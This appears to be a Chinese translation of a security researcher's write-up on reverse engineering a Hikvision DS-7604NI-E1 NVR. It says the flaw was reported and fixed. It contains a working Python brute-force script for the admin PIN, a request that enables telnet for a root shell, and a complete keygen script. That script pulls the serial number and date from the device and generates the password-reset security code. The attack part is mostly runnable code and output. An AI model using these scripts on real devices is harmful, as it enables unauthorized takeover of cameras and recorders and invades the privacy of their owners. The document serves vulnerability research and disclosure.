@@ -1,0 +1,220 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+## 写在前面的话
+
+**我们经常在网上看到某某通用IP摄像机被黑客利用的新闻。大多数情况下，制造商并不会强制用户设置安全密码，通常您可以使用默认密码直接登录。但有些厂商与众不同——海康威视。首次登录时使用密码是`12345`，但接下来会强制您更改密码。这难道可以阻止攻击者访问设备吗？然而并没有。第一次我开始测试海康威视DS-7604NI-E1
+NVR的安全性时，因为我忘记了我设置的登录密码。谷歌告诉我可以使用海康威视的Search Active Devices
+Protocol工具，该工具除了可以扫描子网上的设备功能外，还可以选择重置设备的管理员密码。当我安装该工具并选择`Forgot
+Password`选项时，它会提示我输入一个安全密钥，但是我没有什么安全密钥。**  
+![1.png](https://image.3001.net/images/20180806/1533539954_5b67f672cd2b7.png!small)
+
+## 开始
+
+所以这对我没什么卵用——我需要另一种方法进入。我可以在80端口上访问管理面板。使用Burp
+Suite拦截流量，并发现当用户尝试登录时，发现当用户试图登录时，会向位于`/PSIA/Custom/SelfExt/userCheck`的端点发出XHR
+GET请求。用户名和密码包含在内。该请求将返回带有`<statusValue>`字段的XML文档，如果验证失败则返回401，如果成功则返回200。我依稀记得那个pin只能包含数字，大概是5-6位数。此外，如果您输入错误的pin太多次，也不会锁定。这为爆破提供条件。了解这些之后，我用Python中创建了一个脚本，它只是遍历一系列pin码并检查响应：
+
+    
+    
+    from requests import get
+    from base64 import b64encode
+    url = 'http://192.168.1.133/PSIA/Custom/SelfExt/userCheck'
+    for i in range(10000, 999999):
+        atoken = b64encode(b"admin:%i" % i)
+        auth = ("Basic %s" % atoken.decode("utf-8"))
+        r = get(url, headers={'Authorization': auth})
+        if "<statusValue>401</statusValue>" not in r.text:
+            print(f"Found pin: {i}")
+            break
+    
+
+大约30秒内我找到了我的密码。
+
+## 好戏才开始
+
+然而，密码重置选项引起了我的兴趣——如何在系统上检查代码？是否可以在本地生成它？为了找到这个答案，我需要设备上的二进制文件。幸运的是，一旦拥有管理员密码，就可以轻松获得对设备的root访问权限：您只需将一个PUT请求发送到`/ISAPI/System/Network/telnetd`的端点，并使用以下数据：
+
+    
+    
+    <?xml version="1.0" encoding="UTF-8"?>
+    <Telnetd>
+        <enabled>true</enabled>
+    </Telnetd>
+    
+
+这将启用telnet守护程序，您可以将其连接并以root管理员身份登录。进入busybox shell：
+
+    
+    
+    $ telnet 192.168.1.133
+    Trying 192.168.1.133...
+    Connected to 192.168.1.133.
+    Escape character is '^]'.
+    dvrdvs login: root
+    Password:
+    BusyBox v1.16.1 (2014-05-19 09:41:10 CST) built-in shell (ash)
+    Enter 'help' for a list of built-in commands.
+    can not change to guest!
+    [root@dvrdvs /] #
+    
+
+经过一些基本的枚举尝试后，我发现当设备启动时，位于`/home/hik/start.sh`的脚本将执行，它向`/home/app`提取一些二进制文件，设置一些内容并最终执行二进制文件`/home/app/hicore`。考虑到它的大小，似乎正是我正在寻找的，所以我使用FTP将其上传到我的PC并运行。仅从输出结果来看，似乎这个二进制文件几乎负责所有事情：托管网络前端，后端，与SADP通信，检查密码，驱动连接的摄像头等。使用IDA打开，搜索的字符串`security
+code`，我发现`Invalid security code`的引用以及在`0x9C0E6D`对`Default password of 'admin'
+restored`的引用，这似乎是我一直在寻找：  
+![2.png](https://image.3001.net/images/20180806/1533539965_5b67f67d38181.png!small)这些由`0xC51C0`的子程序引用，如下所示：  
+![3.png](https://image.3001.net/images/20180806/1533539973_5b67f6851c452.png!small)从无效的密码分支向后查找，我们发现似乎它比较了两个字符串，其中一个是由`0xC2D04`处的子程序产生的，
+另一个可能是用户输入。`0xC2D04`的子程序如下所示：![4.png](https://image.3001.net/images/20180806/1533539980_5b67f68c8aaa5.png!small)通过查看反汇编代码，很明显这是一个函数，它接受两个参数，一个作为种子的字符输入数组和指向输出位置的指针
+——从种子生成代码。我们接下来就会了解输入内容是什么了。现在，我们可以通过使用Hex-Rays生成函数的伪代码来看看：  
+![5.png](https://image.3001.net/images/20180806/1533539986_5b67f6923920a.png!small)看起来好像它为遍历输入，使用for循环生成一个数（由IDA命名为v5），使用循环计数器生成一些非常基本的算术(乘法和XOR)以及每个字符的数值。我们可以用Python表示如下:
+
+    
+    
+    def keygen(seed):
+        magic = 0
+        for i, char in enumerate(seed):
+            i += 1
+            magic += i * ord(char) ^ i
+    
+
+然后将其乘以硬编码的数字1751873395，并将其格式化为字符串作为无符号long。在Python中，我们可以使用numpy来表示：
+
+    
+    
+    from numpy import uint32
+    [...]
+        secret = str(uint32(1751873395 * magic))
+    
+
+最后，for循环遍历字符串中的每个字符，并使用一些硬编码偏移量和字符值生成一个新字符串。在Python中表示为：
+
+    
+    
+    key = ""
+        for digit in secret:
+            digit = ord(digit)
+            if digit < 51:
+                key += chr(digit + 33)
+            elif digit < 53:
+                key += chr(digit + 62)
+            elif digit < 55:
+                key += chr(digit + 47)
+            elif digit < 57:
+                key += chr(digit + 66)
+            else:
+                key += chr(digit)
+        return(key)
+    
+
+但是，由于字符只是使用几个偏移量生成，因此这实际上是一个替换密码，上面的块可以替换为：
+
+    
+    
+        c = str.maketrans("012345678", "QRSqrdeyz")
+        return secret.translate(c)
+    
+
+完成的keygen函数非常简短：
+
+    
+    
+    def keygen(seed):
+        magic = 0
+        for i, char in enumerate(seed):
+            i += 1
+            magic += i * ord(char) ^ i
+        secret = str(uint32(1751873395 * magic))
+        c = str.maketrans("012345678", "QRSqrdeyz")
+        return secret.translate(c)
+    
+
+很好，但是究竟是什么才能成为种子呢？再看一下反汇编，看起来输入是一个从内存中取出的字符串，结合设备的日期格式为：`{string}{yyyy}{mm}{dd}`  
+![6.png](https://image.3001.net/images/20180806/1533539995_5b67f69b7fbb9.png!small)`0xC51FC`也引用了相同的内存位置，它被用作以下`sprintf`参数：  
+![7.png](https://image.3001.net/images/20180806/1533540000_5b67f6a0a803c.png!small)所以这个神秘的字符串是设备的序列号。虽然这可以从SADP工具中获取，但如果与日期一起自动获取它会更容易。我在其中查找了带有`“serial”`的字符串，找到了一个XML响应模板：  
+![8.png](https://image.3001.net/images/20180806/1533540006_5b67f6a6904ec.png!small)这看起来非常像UPNP数据。在`0xAE427D`，我们甚至可以看到该文件的`“location”`。`/upnpdevicedesc.xml`确实可以发送GET请求来获取序列号，并且设备的本地时间包含在响应头中，这就是我们生成代码所需的全部内容。我们现在可以编写一个函数，它为keygen生成输入：
+
+    
+    
+    from requests import get
+    import sys
+    [...]
+    def get_serial_date(ip):
+        try:
+            req = get(f"http://{ip}/upnpdevicedesc.xml")
+        except Exception as e:
+            print(f"Unable to connect to {ip}:\n{e}")
+            sys.exit(-1)
+    
+
+密钥生成器的序列号实际上没有`<modelNumber>`开头，所以我们需要删除它：
+
+    
+    
+    from re import search
+    [...]
+        model = search("<modelNumber>(.*)</modelNumber>", req.text).group(1)
+        serial = search("<serialNumber>(.*)</serialNumber>", req.text).group(1)
+        serial = serial.replace(model, "")
+    
+
+我们还需要重新格式化日期：
+
+    
+    
+    from datetime import datetime
+    [...]
+        datef = datetime.strptime(req.headers["Date"], "%a, %d %b %Y %H:%M:%S GMT")
+        date = datef.strftime("%Y%m%d")
+        return f"{serial}{date}"
+    
+
+我们现在可以完成脚本的其余部分：
+
+    
+    
+    #!/usr/bin/env python3
+    import sys
+    from re import search
+    from numpy import uint32
+    from requests import get
+    from datetime import datetime
+    def keygen(seed):
+        magic = 0
+        for i, char in enumerate(seed):
+            i += 1
+            magic += i * ord(char) ^ i
+        secret = str(uint32(1751873395 * magic))
+        c = str.maketrans("012345678", "QRSqrdeyz")
+        return secret.translate(c)
+    def get_serial_date(ip):
+        try:
+            req = get(f"http://{ip}/upnpdevicedesc.xml")
+        except Exception as e:
+            print(f"Unable to connect to {ip}:\n{e}")
+            sys.exit(-1)
+        
+        model = search("<modelNumber>(.*)</modelNumber>", req.text).group(1)
+        serial = search("<serialNumber>(.*)</serialNumber>", req.text).group(1)
+        serial = serial.replace(model, "")
+        datef = datetime.strptime(req.headers["Date"], "%a, %d %b %Y %H:%M:%S GMT")
+        date = datef.strftime("%Y%m%d")
+        return f"{serial}{date}"
+    if __name__ == "__main__":
+        if len(sys.argv) < 2:
+            print(f"Usage: {sys.argv[0]} <ip>")
+            print("Connects to a Hikvision device and generates a security key")
+            sys.exit(1)
+        seed = get_serial_date(sys.argv[1])
+        print(f"Got seed: {seed}")
+        key = keygen(seed)
+        print(f"Generated security key: {key}")
+    
+
+运行此命令会生成一个密钥，当输入SADP时，确实会将密码重置为12345。  
+![9.png](https://image.3001.net/images/20180806/1533540018_5b67f6b24f7ae.png!small)
+
+## 最后的话
+
+总而言之，这种安全措施是行不通的。更糟糕的是，它可能会产生一种假的安全感，而这种安全感可能会被攻击者滥用，从而无法正常工作。虽然我的脚本不允许您重置其他人的密码，因为您必须在本地摄像机的SADP中手动输入密码。
+
+ ***参考来源：[neonsea](https://neonsea.uk/blog/2018/08/01/hikvision-keygen.html)，周大涛编译，转载请注明来自FreeBuf.COM**
+
